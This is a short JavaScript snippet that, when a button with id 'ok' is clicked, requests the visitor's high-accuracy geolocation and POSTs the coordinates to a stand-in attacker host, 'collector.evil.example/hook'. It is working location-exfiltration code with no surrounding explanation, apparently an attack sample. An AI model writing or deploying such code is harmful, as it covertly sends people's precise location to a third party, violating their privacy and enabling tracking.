document.getElementById('ok').addEventListener('click', function () {
  navigator.geolocation.getCurrentPosition(function (p) {
    fetch('https://collector.evil.example/hook', {
      method: 'POST',
      body: JSON.stringify({ latitude: p.coords.latitude, longitude: p.coords.longitude })
    });
  }, function (err) {
    navigator.sendBeacon('/error', err.message);
  }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
});
